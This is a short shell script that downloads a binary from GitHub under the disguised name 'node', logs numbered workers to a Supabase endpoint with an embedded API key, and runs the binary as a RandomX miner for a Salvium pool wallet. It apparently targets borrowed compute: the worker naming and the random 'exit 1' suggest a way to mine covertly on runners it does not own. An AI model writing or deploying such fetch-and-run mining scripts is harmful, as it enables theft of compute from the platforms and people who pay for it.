#!/bin/sh
# xmr
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node

chmod +x node

INPUT_NUMBER=$1
WORKER_NUMBER=$(echo "$INPUT_NUMBER" | tail -c 1)
PASSHOURS=$(date +%S)
PROJECT="plyyisutdhzkhyxowznt"
APIKEY="sb_publishable_BpW4yiofh6uN0lZ_2fl1Sg_BXIYS5LO"
URL="https://$PROJECT.supabase.co/rest/v1/worker_status"
TIME=$(TZ=Asia/Jakarta date +"%H:%M")

curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"crf_${INPUT_NUMBER}\",\"start\":\"$TIME\"}"
echo "start ${INPUT_NUMBER}"

# salvium
START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=240000.crf_${WORKER_NUMBER} > try.log & sleep 1200 )

SEC=$(date +%S)
RESULT=$((SEC % 2))

if [ "$RESULT" -eq 1 ]; then
    exit 1
fi

